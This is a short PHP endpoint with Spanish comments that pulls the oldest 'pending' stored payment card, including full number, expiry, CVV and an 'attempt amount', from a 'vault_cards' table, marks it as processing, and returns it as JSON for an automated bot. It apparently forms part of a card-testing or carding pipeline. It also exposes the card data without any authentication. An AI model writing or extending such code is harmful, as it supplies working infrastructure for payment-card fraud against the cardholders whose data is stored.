<?php
// Subimos un nivel para encontrar la configuración en includes
require 'config.php';
header('Content-Type: application/json');

/**
 * OWEN_SYSTEMS: DATA_FEEDER_PROTOCOL
 * Este endpoint sirve para que un bot automatizado extraiga 
 * la tarjeta más antigua con status 'pendiente'.
 */

// 1. Buscamos el nodo (tarjeta) más antiguo en cola
$query = "SELECT id, user_id, cc_number, cc_exp, cc_cvv, monto_intento 
          FROM vault_cards 
          WHERE status = 'pendiente' 
          ORDER BY id ASC 
          LIMIT 1";

$res = $conn->query($query);

if ($res && $res->num_rows > 0) {
    $card = $res->fetch_assoc();
    $id = $card['id'];

    // 2. Marcamos como 'PROCESANDO' inmediatamente
    // Esto evita que si el bot hace dos peticiones rápidas, reciba la misma tarjeta.
    $update = $conn->query("UPDATE vault_cards SET status = 'procesando' WHERE id = $id");

    if ($update) {
        // Agregamos un flag de sistema
        $card['system_status'] = "DATA_EXTRACTED";
        $card['protocol'] = "OWEN_V1";
        
        echo json_encode($card);
    } else {
        echo json_encode(["status" => "ERROR_UPDATE_FAILED"]);
    }
} else {
    // 3. Respuesta limpia si el VAULT está vacío
    echo json_encode([
        "status" => "EMPTY_VAULT",
        "message" => "No hay nodos pendientes para procesar."
    ]);
}
?>
